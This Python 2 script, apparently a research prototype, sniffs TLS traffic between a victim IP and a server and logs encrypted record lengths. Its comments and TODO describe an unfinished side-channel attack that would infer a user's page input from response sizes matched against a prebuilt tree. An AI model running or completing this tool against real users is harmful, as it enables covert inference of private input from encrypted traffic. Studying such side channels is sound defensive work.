#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This file is used by the attacker to sniff the network traffic of the victim and
# Exploit the pre-built tree in order to infer the user input on a page protected
# by encrypted traffic (TLS/SSL)

import sys
import pyshark
import requests
import time
import multiprocessing

class trafficWeight:
  def __init__(self):
    self.request = 0
    self.response = 0

NO_ETH_ATTRIBUTE_ERR = 'No attribute eth'
NO_IP_ATTRIBUTE_ERR = 'No attribute ip'
NO_TCP_ATTRIBUTE_ERR = 'No attribute tcp'
NO_SSL_ATTRIBUTE_ERR = 'No attribute ssl'

def calculateTrafficWeight(interfac, victimIP, serverIP):
  # Build filters: Here we are only interested in capturing the encrypted traffic between the victim machine and the server hosting the webapp
  bpFilters = 'host ' + victimIP + ' and host ' + serverIP

  traffic = trafficWeight()
  requestSize = 0
  responseSize = 0

  capture = pyshark.LiveCapture(interface=interfac, bpf_filter=bpFilters)
  for packet in capture.sniff_continuously():
    try:
      # Verify the type of packet we manipulate
      layersName = []
      for i in range(len(packet.layers)):
        layersName.append(packet.layers[i]._layer_name)

      if 'eth' not in layersName:
        raise AttributeError(NO_ETH_ATTRIBUTE_ERR)
      elif 'ip' not in layersName:
        raise AttributeError(NO_IP_ATTRIBUTE_ERR)
      elif 'tcp' not in layersName:
        raise AttributeError(NO_TCP_ATTRIBUTE_ERR)
      elif 'ssl' not in layersName:
        raise AttributeError(NO_SSL_ATTRIBUTE_ERR)

      # At the end of this first step, we are able to know the nature of the packet we received
      # So, we know what we can or cannot do wth it


      # If we reach this point we have a SSL, TCP, IP, ETH packet, so we can access these attributes
      src = packet.ip.src
      dst = packet.ip.dst
      if src == victimIP:
        print("FRAME: %d === REQUEST (From %s, To: %s) === \t\t =========>" % (int(packet.number), src, dst))
        print("Encrypted Data Length: ", packet.ssl.record_length)
        print("Time of sniffing: ", packet.sniff_time)
        print("=====================================================================\n\n")
        requestSize += int(packet.ssl.record_length)

      elif src == serverIP:
        print("FRAME: %d === RESPONSE (From %s, To: %s) === \t\t <=========" % (int(packet.number), src, dst))
        print("Encrypted Data Length: ", packet.ssl.record_length)
        print("Time of sniffing: ", packet.sniff_time)
        print("======================================================================\n\n")
        responseSize += int(packet.ssl.record_length)

    except AttributeError, e:
      if str(e) == NO_ETH_ATTRIBUTE_ERR:
        print("This packet is not an ETH packet !")
      elif str(e) == NO_IP_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the ETH layer data
        print("This packet is not an IP packet !")
      elif str(e) == NO_TCP_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the IP and ETH layers data
        print("This packet is not an TCP packet !")
      elif str(e) == NO_SSL_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the TCP, IP and ETH layers data
        if packet.ip.src == victimIP:
          # tcp.analysis_acks_frame returns "[This is an ACK to the segment in frame: 3]", so it returns the segments for which this segment is a ACK
          print("FRAME: %d == CLIENT ACK: This is a ACK to the segment in frame: %s\n" % (int(packet.number), packet.tcp.analysis_acks_frame))
          #traffic.request = requestSize
          #traffic.response = responseSize
          # When the client ACK, we have the entire response, so we can have the total weight
          #return traffic
        elif packet.ip.src == serverIP:
          print("FRAME: %d == SERVER ACK: This is a ACK to the segment in frame: %s\n" % (int(packet.number), packet.tcp.analysis_acks_frame))
        else:
          print("FRAME: %d == UNHANDLED TCP PACKET" % int(packet.number))
      else:
        print("Unhandled error ! --> ", str(e))


## main ##############@
if len(sys.argv) < 3:
    print("""Invalid number of arguments
Use: python test.py [interface] [victimIP] [serverIP]""")
    sys.exit(0)

# Defining the environment
interfac = sys.argv[1]
victimIP = sys.argv[2]
serverIP = sys.argv[3] # Obtained after a traceroute

calculateTrafficWeight(interfac, victimIP, serverIP)

# TODO:
# Here once we manage to exploit the packets, we should be able to:
# 2) According to the previous result (request/response): if this is a request then --> store the timestamp and use it to catch the packet corresponding to the associated response, if this is a response collect all the packets of the response +  get their size and build the total size of the response
# 3) Using the total size of the response, get the node of the tree we built in the "treeBuilder" --> this tree is a labelled tree, which label is the size of the response from the server -> so by using the size we computed, we could do a lookup and extract the good node.
# Store the value of the node we found and iterate.
